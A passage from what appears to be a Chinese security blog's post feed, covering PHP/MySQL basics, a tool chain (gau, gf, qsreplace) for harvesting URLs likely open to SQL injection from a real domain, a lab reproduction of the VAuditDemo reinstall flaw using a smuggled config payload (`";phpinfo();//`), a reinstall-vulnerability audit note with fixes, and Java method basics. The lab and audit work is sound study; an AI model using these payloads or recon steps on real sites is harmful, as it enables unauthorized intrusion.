class="variable">$recv</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;数据库选择失败&quot;</span>.mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;选择数据库成功&quot;</span>;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><h4 id="php创建数据表"><a href="#php创建数据表" class="headerlink" title="php创建数据表"></a>php创建数据表</h4><p>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (column_name column_type);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用工具筛选sql注入链接</title>
      <link href="/posts/15254/"/>
      <url>/posts/15254/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文采用了三个github小工具组合筛选出可能存在sql注入的链接地址，方便对sql注入漏洞直接进行检测，以下工具需要使用go环境进行编译运行，请小伙伴自行下载，或者采用KALI系统（自带）进行运行。下面开始介绍！</p><h2 id="GO设置代理"><a href="#GO设置代理" class="headerlink" title="GO设置代理"></a>GO设置代理</h2><p>由于go原生下载环境访问github等地址速度较慢，所以可以采用设置代理的方式进行访问。</p><p>1.使用 go version 指令获取go的版本信息</p><p><img src="image-20210818122410693.png" alt="image-20210818122410693"></p><p>go 的版本在1.13以上版本时，可使用以下命令继续设置代理</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> env -w GO111MODULE=on</span><br><span class="line"><span class="keyword">go</span> env -w GOPROXY=https:<span class="comment">//goproxy.cn,direct</span></span><br></pre></td></tr></table></figure><p>其他版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export GO111MODULE=on</span><br><span class="line">export GOPROXY=https://goproxy.cn</span><br></pre></td></tr></table></figure><p>取消代理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go env -u GOPROXY</span><br></pre></td></tr></table></figure><p>最后可通过 go env 指令查看 代理是否已经设置成功</p><h2 id="工具一-GAU"><a href="#工具一-GAU" class="headerlink" title="工具一 GAU"></a>工具一 GAU</h2><p>工具地址：<a href="https://github.com/lc/gau">https://github.com/lc/gau</a></p><p>工具功能：枚举指定界面的所有的url链接。</p><p>工具下载： 使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u -v github.com/lc/gau</span><br></pre></td></tr></table></figure><p>下载gau脚本，脚本的存放地址是go在配置中设置的默认存放地址，可通过 go env命令查看</p><p><img src="image-20210818123115430.png" alt="image-20210818123115430"></p><p>在bin目录下存在gau可执行文件，在该文件夹下执行以下命令，建立软链接（可选）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s $(pwd)/gau /usr/local/bin/gau</span><br></pre></td></tr></table></figure><p>也可以直接在gau文件同级目录下执行即可</p><p>工具的使用这里只做简单介绍，可自行研究</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>1.获取指定URL的所有相关的链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;http://www.baidu.com&quot; |gau</span><br></pre></td></tr></table></figure><p><img src="image-20210818124025357.png" alt="image-20210818124025357"></p><p>2.获取指定域名以及子域名下的所有链接   参数  -subs</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;http://www.baidu.com&quot; |gau -subs &quot;baidu.com&quot;</span><br></pre></td></tr></table></figure><p>即可获取所有的链接地址</p><p>3.排除图片等文件地址</p><p>使用 -b 参数排除不要的图片文件地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;http://www.baidu.com&quot; |gau  -b png.jpg </span><br></pre></td></tr></table></figure><p>4.日常使用</p><p>可组合以上命令对文件进行筛选</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;http://www.baidu.com&quot; |gau  -b png.jpg -subs &quot;baidu.com&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们获取了所有的链接地址，那么如何获取带有参数的URl地址呢？</p><p>上工具</p><h2 id="工具二-GF"><a href="#工具二-GF" class="headerlink" title="工具二 GF"></a>工具二 GF</h2><p>工具地址：<a href="https://github.com/tomnomnom/gf">https://github.com/tomnomnom/gf</a></p><p>工具功能：通过正则的方式提取出所需要的数据</p><p>辅助工具：<a href="https://github.com/1ndianl33t/Gf-Patterns">https://github.com/1ndianl33t/Gf-Patterns</a>  ，该脚本是GF工具已写好的正则配置，我们可以直接使用</p><p>工具安装：</p><p>1.安装GF</p><p>go get -u github.com/tomnomnom/gf</p><p>安装位置默认也是go的默认保存位置，下面不在赘述</p><p>小坑：</p><p>​    下载完成后需要使用以下命令在根目录下创建.gf 文件夹，否则将无法使用</p><p>​     mkdir ~/.gf</p><p>2.下载GF-patterns</p><p>可以通过命令进行下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/1ndianl33t/Gf-Patterns </span><br></pre></td></tr></table></figure><p>如果无法下载也可以直接访问该github地址进行下载，如何访问github请自行解决。</p><p>下载完成后进行到 GF-Patterns目录上一级，执行以下命令将该文件夹内所有内容转移到 .gf文件夹下，供gf脚本进行调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv ./Gf-Patterns/* ~/.gf/</span><br></pre></td></tr></table></figure><p>至此工具二就安装完毕</p><h3 id="提取链接地址"><a href="#提取链接地址" class="headerlink" title="提取链接地址"></a>提取链接地址</h3><p>GF工具使用非常简单，只需要在.gf文件夹下放置对应的配置文件即可直接调用</p><p>例如我们想要获取所有带有参数的所有链接,可通过以下命令进行筛选</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;http://www.baidu.com&quot; |gau  -b png.jpg -subs &quot;baidu.com&quot;|./gf sqli</span><br></pre></td></tr></table></figure><p><img src="image-20210818125950995.png" alt="image-20210818125950995"></p><p>即可提取所有链接地址</p><p>可将所有的文件保存到txt中，供工具三使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;http://www.baidu.com&quot; |gau  -b png.jpg -subs &quot;baidu.com&quot;|./gf sqli &gt; sqli.txt</span><br></pre></td></tr></table></figure><h2 id="工具三-qsreplace"><a href="#工具三-qsreplace" class="headerlink" title="工具三  qsreplace"></a>工具三  qsreplace</h2><p>工具地址：<a href="https://github.com/tomnomnom/qsreplace">https://github.com/tomnomnom/qsreplace</a></p><p>工具功能：去重URL，替换url参数值为固定值</p><p>安装方式：</p><p>使用go进行安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/tomnomnom/qsreplace</span><br></pre></td></tr></table></figure><p>最终是qsreplace可执行文件</p><p>工具使用：</p><p>前面我们通过工具二获取了sqli.txt文本，这里我们可以利用该工具对文本继续处理，获取最终去重后的URL地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sqli.txt | qsreplace fuzz &gt; duplicateremove.txt</span><br></pre></td></tr></table></figure><p>至此url处理完成，可以愉快的玩耍了！</p><h2 id="命令总结"><a href="#命令总结" class="headerlink" title="命令总结"></a>命令总结</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;https://example.com&quot; | gau -b png,jpg -subs example.com &gt; sqli.txt</span><br><span class="line"></span><br><span class="line">cat sqli.txt | qsreplace fuzz &gt; duplicateremove.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> tools使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VAuditDemo重装漏洞复现</title>
      <link href="/posts/18977/"/>
      <url>/posts/18977/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本专题是针对互联网已知漏洞进行复现分析的文章，如有错误，请各位师傅指正。</p><h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><p>CMS下载链接：<a href="https://github.com/virink/VAuditDemo">https://github.com/virink/VAuditDemo</a></p><p>使用phpstudy进行安装搭建，放在phpstudy web根目录下即可</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>由于本次分析漏洞为重装漏洞，所有首先查看install目录下的install.php文件。</p><p><img src="VAuditDemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210811143343315.png" alt="image-20210811143343315"></p><p>在行首位置判断了机器是否已经安装，已经安装就会退出</p><p>下面都是一些关于权限的判断，是否可读可写，直到用户可以输入的地方，通过POST方式传入数据库相关的信息</p><p>往下会发现$str_tmp变量拼接了许多的信息，并被写入到了/sys/config.php文件中，在$str_tmp中将前面POST的参数传入到了config.php文件中并且未经过任何的过滤，漏洞点就存在这里。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dbhost</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dbhost&quot;</span>];</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dbuser&quot;</span>];</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dbpass&quot;</span>];</span><br><span class="line"><span class="variable">$dbname</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dbname&quot;</span>];</span><br><span class="line"><span class="comment">#传入数据库信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$str_tmp中的数据 写入到文件中</span></span><br><span class="line">    <span class="variable">$str_tmp</span>=<span class="string">&quot;&lt;?php\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_end</span>=<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;error_reporting(0);\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;if (!file_exists(\$_SERVER[\&quot;DOCUMENT_ROOT\&quot;].&#x27;/sys/install.lock&#x27;))&#123;\r\n\theader(\&quot;Location: /install/install.php\&quot;);\r\nexit;\r\n&#125;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;include_once(&#x27;../sys/lib.php&#x27;);\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\$host=\&quot;<span class="subst">$dbhost</span>\&quot;; \r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\$username=\&quot;<span class="subst">$dbuser</span>\&quot;; \r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\$password=\&quot;<span class="subst">$dbpass</span>\&quot;; \r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\$database=\&quot;<span class="subst">$dbname</span>\&quot;; \r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\$conn = mysql_connect(\$host,\$username,\$password);\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;mysql_query(&#x27;set names utf8&#x27;,\$conn);\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;if (!\$conn)\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;&#123;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\tdie(&#x27;Could not connect: &#x27; . mysql_error());\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\texit;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;&#125;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;session_start();\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$str_tmp</span>.=<span class="variable">$str_end</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span>=fopen( <span class="string">&quot;../sys/config.php&quot;</span>, <span class="string">&quot;w&quot;</span> );</span><br><span class="line">fwrite( <span class="variable">$fp</span>, <span class="variable">$str_tmp</span> );</span><br><span class="line">fclose( <span class="variable">$fp</span> );</span><br></pre></td></tr></table></figure><p>我们可以通过操纵数据库连接的字段达到写入任意代码的目的，从而可以getshell。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先查看下正常安装模式下的config.php文件中database的值</p><p><img src="VAuditDemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210811144734866.png" alt="image-20210811144734866"></p><p>$database字段通过双引号以及；进行闭合，那么我们在写入数据时需要闭合以上的字符，然后拼接我们自己的代码即可执行</p><p>下面开始复现</p><p>1.使用burp抓取安装数据包</p><p><img src="VAuditDemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210811145249327.png" alt="image-20210811145249327"></p><p>点击安装时使用burp进行抓包</p><p>将dbname字段修改为 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test -- &quot;;phpinfo();//</span><br></pre></td></tr></table></figure><p><img src="VAuditDemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210811151107016.png" alt="image-20210811151107016"></p><p>在config.php文件中database字段已经被修改</p><p><img src="VAuditDemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210811151221187.png" alt="image-20210811151221187"></p><p>并且主页中index.php显示了phpinfo的界面，漏洞复现成功</p><p><img src="VAuditDemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210811151313902.png" alt="image-20210811151313902"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>使用phpstudy搭建环境时，需要将php.ini中的magic_quotes_gpc的值修改为OFF，否则实验将复现失败</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计之重装漏洞</title>
      <link href="/posts/32181/"/>
      <url>/posts/32181/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是PHP代码审计笔记的第一篇，接下来的一系列文章中将收集复现PHP代码审计课程中经典的各种漏洞环境，本文是博主的个人总结文章，如果文章有中任何错误，也请各位大佬指正！</p><h1 id="重装漏洞"><a href="#重装漏洞" class="headerlink" title="重装漏洞"></a>重装漏洞</h1><p>当我们管理者在安装完系统之后，如果没有对安装文件进行一个加锁或者删除或者在对系统是否安全文件进行校验时校验不当，导致绕过，就有可能被攻击者进行利用。</p><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>1.重装系统漏洞可以对web业务系统进行重新安装，从而对系统的配置选项进行更改，如cms后台登陆密码等，可直接登陆后台等危害</p><p>2.重装系统可以在安装选项时通过写入一句话木马等方式写入到系统配置文件中，导致系统被GETSHELl</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>通过对网上已知重装漏洞类型的分类</p><p>1.无验证安装</p><p>系统没有对是否系统已经安装进行校验，访问安装文件后可以直接进行重新安装系统</p><p>2.安装file步骤绕过</p><p>系统通过get方式对系统进行安装，可以通过修改GET参数绕过系统已安装的限制，直接进入下一步</p><p>3.变量覆盖导致重装</p><p>例如验证的是否安装的参数为$islockfile </p><p>通过 GET，POST，cookie等方式提交一个变量名为$islockfile，将值为空，从而覆盖掉原有的值，这样判断是否已经安装的判断语句为False,即可重新安装系统</p><p>4.判断 lock后无exit</p><p>​    系统判断了是否已经安装过，但是仅仅进行了跳转，没有对程序进行退出，终止继续安装的行为，导致安装代码仍然可以在后台进行安装，或者退出程序不是类的初始化函数，那么退出该函数不影响其他函数的使用。</p><p>5.解析漏洞</p><p>系统安装完毕后将install.php重命名为install.php.bak或其他名称，此时可以利用apache的解析漏洞，从而正常的进行安装程序</p><p>6.其他组合漏洞的绕过</p><p>可以利用任意文件删除等漏洞将该文件进行删除，从而触发重装漏洞</p><h1 id="重装漏洞实战"><a href="#重装漏洞实战" class="headerlink" title="重装漏洞实战"></a>重装漏洞实战</h1><p>本节是对互联网上出现过的重装漏洞的复现以及分析，由于全部写在一起篇幅较大，因此采用超链接形式进行观看。</p><p>[1]</p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>1、正确处理lock文件<br>2、判断安装完成后要退出<br>3、在安装的每一步都需要验证<br>4、对所有输入点进行过滤</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>重装漏洞是一个非常严重的漏洞，如果存在该漏洞，那么对于网站来说基本上可以说是毁灭级别的，在漏洞挖掘过程中主要关注系统安装文件以及配置文件写入是否过滤等信息。ok，本节文章就到此结束了，感谢各位师傅观看。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1]<a href="https://blog.csdn.net/gd_9988/article/details/104756983PHP">https://blog.csdn.net/gd_9988/article/details/104756983PHP</a>  代码审计之重装漏洞-Day2</p><p>[2]<a href="https://threezh1.com/2019/05/18/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/">https://threezh1.com/2019/05/18/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/</a>  PHP代码审计之重装漏洞</p><p>[3] <a href="https://sqlmap.wiki/posts/%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/">https://sqlmap.wiki/posts/%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/</a> 代码审计入门-重装漏洞</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java基础-方法学习</title>
      <link href="/posts/1926/"/>
      <url>/posts/1926/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是方法"><a href="#什么是方法" class="headerlink" title="什么是方法"></a>什么是方法</h1><p>java方法是语句的集合，他们在一起组合执行一个功能</p><p>1.方法是解决一类问题的步骤的有序集合</p><p>2.方法包含于类或对象中</p><p>3.方法在程序中被创建，在其他地方被引用</p><p>方法的本意是功能块，就是为了实现某个功能的语句块的集合，<font color="red">一个方法最好只实现一个功能，便于后期的拓展</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法的形式：</span><br><span class="line">修饰符 返回值类型 方法名(参数类型 参数名)&#123;</span><br><span class="line">方法体</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">return 返回值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><font color="red">修饰符:</font>可选参数，定义了该方法的访问类型</p></li><li><p><font color="red">返回值类型:</font>可选参数，方法有时候会有返回值，return语句所返回数据的类型和该字段要相符合，若无返回值则此字段为 void</p></li><li><p><font color="red">方法名:</font>方法的实际名称，方法名和参数表共同标识了方法是哪个</p></li><li><p><font color="red">参数类型:</font>参数只是一个占位符，当方法被调用时，数据传输值给参数，方法可以不包含参数</p><p>形式参数：在函数中被定义时的参数为形式参数，仅做占位符使用，用户接受外部传入的数据</p><p>实参：调用方法时传输到方法的参数</p></li><li><p><font color="red">方法体:</font>方法中具体执行语句的序列，定义了该方法的功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        调用add方法</span><br><span class="line">            实际参数</span><br><span class="line">        add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//定义一个方法</span></span><br><span class="line">       修饰符   返回值类型  方法名   形式参数</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>      <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">           返回值</span><br><span class="line">        <span class="keyword">return</span> a + b;   方法体</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h1><p>重载就是在一个类中，有相同的函数名称，但是形参（类型，参数名，个数）的不同，从而实现了相同函数名的功能，成为方法重载</p><p>重载的规则：</p><ul><li>方法名称必须相同</li><li>参数列表必须不同(个数不同或类型不同，参数摆列的顺序不同)</li><li>方法的返回类型可以相同也可以不相同</li><li><font color="red">仅仅返回值类型不同不足以称为方法的重载</font></li></ul><p>原理：</p><p>​    方法名称相同时，编译器会根据调用方法的参数个数，参数的类型逐个去匹配，选择最匹配的方法，若失败则编译器报错</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> a ,<span class="keyword">double</span> b)</span></span>&#123;   参数类型不同</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;     原始add函数</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;   参数个数不同</span><br><span class="line">        <span class="keyword">return</span> a+<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">double</span> b)</span> </span>&#123;  参数类型不同</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">以上四个函数构成了重载</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">int</span> b)</span></span>&#123;     原始add函数</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">double</span> b)</span> </span>&#123;  参数类型不同</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">方法类型交换 同样构成了重载</span><br></pre></td></tr></table></figure><h1 id="命令行传递参数"><a href="#命令行传递参数" class="headerlink" title="命令行传递参数"></a>命令行传递参数</h1><h2 id="遍历main函数参数"><a href="#遍历main函数参数" class="headerlink" title="遍历main函数参数"></a>遍历main函数参数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mains</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;args.length; i++)&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;args[&quot;</span>+i+<span class="string">&quot;]:&quot;</span>+ args[i]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在命令行执行java程序"><a href="#在命令行执行java程序" class="headerlink" 